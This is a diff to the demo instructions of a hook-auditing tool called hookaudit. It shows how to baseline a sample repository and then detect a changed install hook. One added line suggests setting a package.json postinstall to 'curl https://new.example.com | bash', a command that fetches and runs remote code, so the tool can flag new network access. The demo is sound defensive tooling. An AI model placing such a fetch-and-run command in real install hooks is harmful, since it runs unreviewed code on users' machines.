@@ -23,8 +23,11 @@ node bin/hookaudit.js scan --json --path demo/sample-repository | jq .summary
 
 # 2. Baseline → change → diff → NEW_CAPABILITY
 node bin/hookaudit.js baseline --path demo/sample-repository
-# edit demo/sample-repository/scripts/helper.sh — add a new capability line
+# edit demo/sample-repository/package.json postinstall — change to network capability
+# (editing scripts/helper.sh alone won't change baseline file hashes; edit a surface file)
+# example: change package.json postinstall to: curl https://new.example.com | bash
 node bin/hookaudit.js diff --json --path demo/sample-repository | jq .diff.semantic
+# → NEW_CAPABILITY NETWORK_ACCESS, NEW_COMMAND
 
 # 3. Zero-dep
 cat package.json | grep -A2 dependencies
